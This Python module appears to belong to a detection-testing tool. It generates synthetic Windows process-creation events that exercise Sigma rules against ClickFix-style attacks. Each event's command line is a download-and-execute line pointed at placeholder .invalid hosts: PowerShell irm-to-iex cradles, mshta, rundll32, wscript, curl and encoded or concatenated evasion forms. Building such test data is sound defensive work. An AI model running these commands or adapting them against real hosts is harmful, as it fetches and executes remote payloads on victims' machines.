"""Craftsman Agent 2b: Command-line and argument mutator for process creation telemetry."""

from __future__ import annotations

import uuid
from typing import List

from ..models import Variant
from .base import BaseCraftsman


class ProcessCraftsman(BaseCraftsman):
    """Generates synthetic process creation events along argument, aliasing, and LOLBin axes."""

    def generate_variants(self, cycle: int, feedback: List[str] | None = None) -> List[Variant]:
        variants: List[Variant] = []

        if cycle == 1:
            # Cycle 1: Core ClickFix patterns and argument variations
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="syntax",
                    mutation_name="proc_powershell_standard_clickfix",
                    description="Standard ClickFix PowerShell download cradle with hidden window",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -w hidden -c \"irm https://delivery.stage.invalid/patch.ps1 | iex\"",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="obfuscation",
                    mutation_name="proc_powershell_windowstyle_numeric",
                    description="PowerShell using numeric WindowStyle alias (-w 1 instead of -w hidden)",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -w 1 -c \"irm https://delivery.stage.invalid/update | iex\"",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="syntax",
                    mutation_name="proc_powershell_windowstyle_short_h",
                    description="PowerShell using shortest unambiguous switch alias (-w h instead of -w hidden)",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -w h -c \"(New-Object Net.WebClient).DownloadString('https://cdn.invalid/script.txt')\"",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="lolbin",
                    mutation_name="proc_mshta_remote_url",
                    description="MSHTA loading remote HTA file spawned by Explorer",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\mshta.exe",
                        "CommandLine": "mshta.exe http://update-service.invalid/auth/session.hta",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )

        elif cycle == 2:
            # Cycle 2: Downloader alternatives and command staging
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="lolbin",
                    mutation_name="proc_curl_outbound_download",
                    description="Windows curl.exe downloading stage 2 payload from Run dialog",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\curl.exe",
                        "CommandLine": "curl.exe -s -k https://stage2.invalid/payload.bin -o %TEMP%\\update.exe",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="syntax",
                    mutation_name="proc_cmd_start_b_staging",
                    description="CMD launching background PowerShell process using start /b",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\cmd.exe",
                        "CommandLine": "cmd.exe /c start /b powershell.exe -w hidden -c irm https://lure.invalid/test | iex",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="obfuscation",
                    mutation_name="proc_powershell_base64_encoded",
                    description="PowerShell executing encoded command string (-enc)",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBpAG4AdgBhAGwAaQBkAA==",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )

        else:
            # Cycle 3: Advanced LOLBins and evasive invocation primitives
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="lolbin",
                    mutation_name="proc_pwsh_core_clickfix",
                    description="Modern PowerShell 7 (pwsh.exe) execution",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
                        "CommandLine": "pwsh.exe -w hidden -c \"irm https://ps7-delivery.invalid/code | iex\"",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="obfuscation",
                    mutation_name="proc_powershell_split_invoke_restmethod",
                    description="PowerShell string concatenation to evade plain text cmdlet detection",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -w 1 -c \"&('Inv'+'oke-RestMethod') https://evasion.invalid/p\"",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="lolbin",
                    mutation_name="proc_rundll32_url_protocol_handler",
                    description="Explorer spawning rundll32 FileProtocolHandler to open remote URL",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\rundll32.exe",
                        "CommandLine": "rundll32.exe url.dll,FileProtocolHandler https://stage.invalid/lure.hta",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"proc-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="lolbin",
                    mutation_name="proc_wscript_remote_script_fetch",
                    description="Explorer spawning wscript with remote network URI",
                    payload={
                        "EventID": 1,
                        "ParentImage": "C:\\Windows\\explorer.exe",
                        "Image": "C:\\Windows\\System32\\wscript.exe",
                        "CommandLine": "wscript.exe //e:vbscript https://stage.invalid/payload.vbs",
                        "User": "VICTIM-PC\\analyst",
                    },
                    cycle=cycle,
                )
            )

        return variants
